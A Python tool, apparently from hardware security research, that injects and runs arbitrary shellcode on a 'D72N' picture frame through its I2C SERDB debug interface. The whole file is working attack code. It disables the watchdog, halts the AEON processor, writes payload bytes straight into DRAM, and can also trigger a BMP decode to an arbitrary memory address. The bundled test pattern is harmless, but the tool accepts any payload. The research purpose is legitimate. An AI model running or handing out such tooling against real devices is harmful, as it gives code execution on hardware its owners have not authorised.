#!/usr/bin/env python3
"""
D72N Shellcode Injection
=========================

Inject and execute shellcode on the D72N picture frame via SERDB.

This script combines:
  1. Watchdog disable (prevent resets during injection)
  2. AEON halt (stable memory state)
  3. Direct DRAM write (shellcode placement)
  4. AEON resume (execute shellcode)

Or the BMP-based method:
  1. Create shellcode BMP on SD card
  2. Trigger BMP decode to target address via mailbox

Traced from D72N documentation:
  - DRAM buffers: 0x100000 (main), 0x0C0000 (secondary), 0x150000 (output)
  - AEON control: 0x0FE6
  - Watchdog: 0x44CE, 0x44D3
  - BMP command: 0x10

IMPORTANT: This is for authorized security research only.

Usage:
    python3 d72n_shellcode_inject.py /dev/i2c-1 --shellcode shellcode.bin
    python3 d72n_shellcode_inject.py /dev/i2c-1 --test-pattern
    python3 d72n_shellcode_inject.py /dev/i2c-1 --bmp-inject exploit.bmp --target 0x100000
"""

import argparse
import struct
import sys
import time
from d72n_serdb import D72N_SERDB, D72N_ADDR


class D72N_Injector:
    """Shellcode injection controller

    Provides multiple injection methods:
    1. Direct DRAM write via SERDB
    2. BMP decode to arbitrary address via mailbox
    """

    def __init__(self, serdb):
        self.serdb = serdb

    def disable_watchdog(self):
        """Disable watchdog timer

        Traced from block 16 offset 0x1775
        """
        print("[*] Disabling watchdog...")

        state = self.serdb.read_xdata(D72N_ADDR.WDT_STATE)
        new_state = state & 0xFE
        self.serdb.write_xdata(D72N_ADDR.WDT_STATE, new_state)
        self.serdb.write_xdata(D72N_ADDR.WDT_COUNTER_LO, 0x00)
        self.serdb.write_xdata(D72N_ADDR.WDT_COUNTER_HI, 0x00)

        print(f"    State: 0x{state:02X} -> 0x{new_state:02X}")

    def halt_aeon(self):
        """Halt AEON processor

        Traced from block 01 offset 0x3D25
        """
        print("[*] Halting AEON...")

        ctrl = self.serdb.read_xdata(D72N_ADDR.AEON_CTRL)
        new_ctrl = ctrl & 0xFE
        self.serdb.write_xdata(D72N_ADDR.AEON_CTRL, new_ctrl)

        print(f"    Control: 0x{ctrl:02X} -> 0x{new_ctrl:02X}")

    def resume_aeon(self):
        """Resume AEON processor

        Traced from block 01 offset 0x3CDF
        """
        print("[*] Resuming AEON...")

        ctrl = self.serdb.read_xdata(D72N_ADDR.AEON_CTRL)
        new_ctrl = ctrl | 0x01
        self.serdb.write_xdata(D72N_ADDR.AEON_CTRL, new_ctrl)

        print(f"    Control: 0x{ctrl:02X} -> 0x{new_ctrl:02X}")

    def write_shellcode_direct(self, addr, shellcode, verify=True):
        """Write shellcode directly to DRAM via SERDB

        This is slow but reliable. Writes byte-by-byte.

        Args:
            addr: Target DRAM address
            shellcode: bytes to write
            verify: Read back and verify

        Returns:
            True if successful
        """
        print(f"[*] Writing {len(shellcode)} bytes to DRAM 0x{addr:06X}...")

        start_time = time.time()

        for i, byte in enumerate(shellcode):
            self.serdb.write_dram(addr + i, byte)
            if (i + 1) % 64 == 0:
                pct = ((i + 1) * 100) // len(shellcode)
                print(f"\r    Progress: {pct}% ({i+1}/{len(shellcode)})", end='', flush=True)

        elapsed = time.time() - start_time
        print(f"\n    Written in {elapsed:.1f}s ({len(shellcode)/elapsed:.1f} B/s)")

        if verify:
            print("[*] Verifying...")
            errors = 0
            for i in range(min(len(shellcode), 64)):  # Verify first 64 bytes
                expected = shellcode[i]
                actual = self.serdb.read_dram(addr + i)
                if actual != expected:
                    errors += 1
                    print(f"    Mismatch at 0x{addr+i:06X}: "
                          f"expected 0x{expected:02X}, got 0x{actual:02X}")

            if errors == 0:
                print("    Verification passed")
                return True
            else:
                print(f"    Verification FAILED ({errors} errors)")
                return False

        return True

    def trigger_bmp_decode(self, target_addr, source_addr=0x100000):
        """Trigger BMP decode to arbitrary address

        Uses mailbox command 0x10 (MB_BMP_CMD_DECODE_MEM_OUT)
        to decode BMP from source buffer to target address.

        Args:
            target_addr: Where to write decoded pixels
            source_addr: Where BMP data is loaded
        """
        print(f"[*] Triggering BMP decode to 0x{target_addr:06X}...")

        # BMP command layout (from D72N_BMP_DISPLAY_PIPELINE.md):
        # 0x40BC: Command (0x10 = BMP)
        # 0x40BD: Target addr high byte
        # 0x40BE: Target addr mid byte
        # 0x40BF: Target addr low byte
        # 0x40C0: Flags

        # Alternative mailbox at 0x4401+:
        self.serdb.write_xdata(0x4401, 0x10)  # BMP command

        # Write target address params
        self.serdb.write_xdata(0x4402, (target_addr >> 16) & 0xFF)
        self.serdb.write_xdata(0x4403, (target_addr >> 8) & 0xFF)
        self.serdb.write_xdata(0x4404, target_addr & 0xFF)

        # Trigger sync
        self.serdb.write_xdata(0x4417, 0xFF)

        print("    Decode triggered")

    def inject_direct(self, shellcode, target_addr=0x100000):
        """Full direct injection sequence

        1. Disable watchdog
        2. Halt AEON
        3. Write shellcode
        4. Resume AEON

        Args:
            shellcode: bytes to inject
            target_addr: DRAM address for shellcode
        """
        print("=" * 60)
        print("D72N Direct Shellcode Injection")
        print("=" * 60)
        print(f"Target:    0x{target_addr:06X}")
        print(f"Size:      {len(shellcode)} bytes")
        print()

        self.disable_watchdog()
        time.sleep(0.1)

        self.halt_aeon()
        time.sleep(0.1)

        success = self.write_shellcode_direct(target_addr, shellcode)

        if success:
            print()
            print("[*] Shellcode written successfully")
            print("[*] AEON is halted - shellcode will not execute yet")
            print()
            print("To execute, resume AEON with:")
            print(f"    python3 d72n_aeon_control.py {sys.argv[1]} resume")
        else:
            print()
            print("[-] Shellcode injection failed")

        return success

    def inject_via_bmp(self, bmp_file, target_addr=0x100000):
        """Injection via BMP decode

        1. Load BMP to DRAM
        2. Configure mailbox with target address
        3. Trigger decode command

        Note: BMP file must already be on SD card and loaded to decode buffer

        Args:
            bmp_file: Path to BMP file (for analysis)
            target_addr: Target address for decoded pixels
        """
        print("=" * 60)
        print("D72N BMP-Based Shellcode Injection")
        print("=" * 60)
        print(f"BMP File:  {bmp_file}")
        print(f"Target:    0x{target_addr:06X}")
        print()

        # Analyze BMP
        with open(bmp_file, 'rb') as f:
            bmp_data = f.read()

        if bmp_data[:2] != b'BM':
            print("[-] Invalid BMP file")
            return False

        width = struct.unpack('<i', bmp_data[18:22])[0]
        height = struct.unpack('<i', bmp_data[22:26])[0]
        bpp = struct.unpack('<H', bmp_data[28:30])[0]

        print(f"BMP Size:  {width}x{height} @ {bpp}bpp")
        print(f"Pixel data: {len(bmp_data) - 54} bytes")
        print()

        self.disable_watchdog()
        time.sleep(0.1)

        print("[*] Loading BMP to decode buffer...")
        print("    NOTE: BMP must be loaded via SD card slideshow")
        print("          This script only configures the decode target")
        print()

        # Configure target address
        print(f"[*] Setting decode target to 0x{target_addr:06X}")
        self.trigger_bmp_decode(target_addr)

        print()
        print("[+] BMP decode configured")
        print("    When slideshow displays the BMP, shellcode will be written")
        print(f"    to DRAM address 0x{target_addr:06X}")

        return True


def create_test_shellcode():
    """Create simple test shellcode

    Returns:
        bytes: Test pattern that's easy to verify
    """
    shellcode = bytearray()

    # Marker
    shellcode.extend(b'D72N')

    # NOP-like pattern (easily identifiable)
    shellcode.extend(b'\x90' * 32)

    # More markers
    shellcode.extend(b'TEST')
    shellcode.extend(struct.pack('<I', 0xDEADBEEF))
    shellcode.extend(struct.pack('<I', 0xCAFEBABE))

    # Padding
    shellcode.extend(b'\x41' * 64)

    return bytes(shellcode)


def main():
    parser = argparse.ArgumentParser(
        description='D72N Shellcode Injection',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Injection Methods:

1. Direct DRAM Write (--shellcode):
   - Slow but reliable (~100 B/s via I2C)
   - Works with AEON halted
   - Full control over target address

2. BMP Decode (--bmp-inject):
   - Fast (hardware decode)
   - Requires BMP on SD card
   - Shellcode embedded in pixel data

Examples:
    # Inject test pattern
    python3 d72n_shellcode_inject.py /dev/i2c-1 --test-pattern

    # Inject custom shellcode
    python3 d72n_shellcode_inject.py /dev/i2c-1 --shellcode payload.bin

    # Configure BMP decode target
    python3 d72n_shellcode_inject.py /dev/i2c-1 --bmp-inject exploit.bmp --target 0x100000

    # Write to specific address
    python3 d72n_shellcode_inject.py /dev/i2c-1 --shellcode sc.bin --target 0x000200

Target Addresses:
    0x000200    AEON code area (dangerous - may crash)
    0x100000    Main decode buffer (safe for testing)
    0x0C0000    Secondary buffer
    0x150000    Output buffer

WARNING: Writing to AEON code area (0x000200) may crash the device.
         Test with buffer addresses first.
        """
    )

    parser.add_argument('bus', help='I2C bus (e.g., /dev/i2c-1)')

    # Injection method
    method = parser.add_mutually_exclusive_group(required=True)
    method.add_argument('--shellcode', '-s', metavar='FILE',
                        help='Shellcode file to inject')
    method.add_argument('--test-pattern', '-t', action='store_true',
                        help='Inject test pattern')
    method.add_argument('--bmp-inject', metavar='FILE',
                        help='Configure BMP decode injection')
    method.add_argument('--verify', '-v', metavar='ADDR',
                        type=lambda x: int(x, 0),
                        help='Verify memory at address')

    # Options
    parser.add_argument('--target', type=lambda x: int(x, 0),
                        default=0x100000,
                        help='Target DRAM address (default: 0x100000)')
    parser.add_argument('--no-verify', action='store_true',
                        help='Skip verification after write')
    parser.add_argument('--resume', '-r', action='store_true',
                        help='Resume AEON after injection')

    args = parser.parse_args()

    # Parse bus argument
    if args.bus.isdigit():
        bus = int(args.bus)
    else:
        bus = args.bus

    try:
        with D72N_SERDB(bus) as serdb:
            if not serdb.probe():
                print("[-] SERDB not responding at 0x59")
                return 1

            injector = D72N_Injector(serdb)

            if args.verify is not None:
                # Just verify memory at address
                print(f"[*] Reading DRAM at 0x{args.verify:06X}...")
                data = []
                for i in range(64):
                    data.append(serdb.read_dram(args.verify + i))
                print(serdb.hexdump(bytes(data), args.verify))
                return 0

            if args.test_pattern:
                shellcode = create_test_shellcode()
                print(f"[*] Using test pattern ({len(shellcode)} bytes)")

            elif args.shellcode:
                with open(args.shellcode, 'rb') as f:
                    shellcode = f.read()
                print(f"[*] Loaded shellcode from {args.shellcode} ({len(shellcode)} bytes)")

            elif args.bmp_inject:
                success = injector.inject_via_bmp(args.bmp_inject, args.target)
                return 0 if success else 1

            # Direct injection
            success = injector.inject_direct(
                shellcode,
                target_addr=args.target
            )

            if success and args.resume:
                print()
                injector.resume_aeon()

            return 0 if success else 1

    except OSError as e:
        print(f"[-] I2C error: {e}")
        return 1
    except FileNotFoundError as e:
        print(f"[-] File not found: {e}")
        return 1


if __name__ == '__main__':
    sys.exit(main())
